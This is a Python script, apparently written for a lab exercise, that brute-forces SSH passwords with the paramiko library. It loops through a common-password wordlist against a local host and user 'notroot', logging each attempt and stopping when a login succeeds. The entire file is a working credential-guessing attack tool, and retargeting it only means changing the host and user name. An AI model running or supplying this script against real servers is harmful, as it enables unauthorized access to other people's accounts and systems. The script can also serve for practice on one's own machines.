import paramiko

host = "127.0.0.1"
username = "notroot"
attempts = 0

with open("ssh-common-passwords.txt", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        print("[{}] Attempting password: '{}'!".format(attempts, password))
        try:
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh_client.connect(host, username=username, password=password, timeout=1)
            
            # If connection successful, valid password found
            print("[>] Valid password found: '{}'!".format(password))
            ssh_client.close()
            break
        
        except paramiko.ssh_exception.AuthenticationException:
            # Invalid password, continue to next password
            print("[X] Invalid password!")
        
        except Exception as e:
            # Handle other exceptions (connection issues, etc.)
            print("[!] Error: {}".format(e))
        
        finally:
            attempts += 1

